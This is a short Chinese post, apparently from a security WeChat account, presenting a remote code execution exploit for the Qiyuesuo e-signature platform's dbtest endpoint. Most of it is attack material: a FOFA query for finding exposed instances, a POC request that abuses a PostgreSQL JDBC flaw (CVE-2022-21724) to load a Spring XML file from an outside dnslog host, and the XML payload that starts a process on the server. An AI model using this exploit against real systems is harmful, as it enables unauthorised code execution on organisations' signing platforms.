> **原文链接**: https://mp.weixin.qq.com/s?__biz=Mzk1Nzg3ODkyNg==&mid=2247484121&idx=1&sn=43b7919e71e92bcdd179e089796ce428

#  契约锁电子签章系统dbtest远程代码执行  
清晨  摸鱼划水   2025-06-13 08:55  
  
FOFA  

```
app=&#34;契约锁-电子签署平台&#34;
```

  
POC  

```
/setup/dbtest?db=POSTGRESQL&host=localhost&port=5511&username=root&name=test%2F%3FsocketFactory%3Dorg%2Espringframework%2Econtext%2Esupport%2EClassPathXmlApplicationContext%26socketFactoryArg%3Dhttp%3A%2F%2Fxxxxx.dnslog.cn%2F1%2Exml
```

  
路径还可能是  
/api/setup/dbtest  
  
漏洞利用的是PostgreSQL JDBC Driver RCE（CVE-2022-21724）  
  
1.xml文件内容如下：  

```
<beans xmlns=&#34;http://www.springframework.org/schema/beans&#34;
       xmlns:xsi=&#34;http://www.w3.org/2001/XMLSchema-instance&#34;
       xmlns:p=&#34;http://www.springframework.org/schema/p&#34;
       xsi:schemaLocation=&#34;http://www.springframework.org/schema/beans
        http://www.springframework.org/schema/beans/spring-beans.xsd&#34;>
   <bean id=&#34;exec&#34; class=&#34;java.lang.ProcessBuilder&#34; init-method=&#34;start&#34;>
        <constructor-arg>
          <list>
            <value>open</value>
            <value>-a</value>
            <value>calculator</value>
          </list>
        </constructor-arg>
    </bean>
</beans>
```

  
参考：  
  
[契约锁记录](https://mp.weixin.qq.com/s?__biz=MzkzMzI3OTczNA==&mid=2247488129&idx=1&sn=b79dd7ee7ba8d0546187fbe2840103ff&scene=21#wechat_redirect)  
  
  
[契约锁电子签章系统RCE简单分析](https://mp.weixin.qq.com/s?__biz=MzkyMzI3MTI5Mg==&mid=2247485432&idx=1&sn=63e6601ff3509793cf189faf3a909cce&scene=21#wechat_redirect)  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/qJ5apkMXic807TiabD0udvArwzeS6Ab3ibZzxmiaTTHeLk7gYmrPCmKpMqtcgUiachx4oRgqdH9974bynx74uqOEFjg/640?wx_fmt=jpeg&from=appmsg "")  
  
  
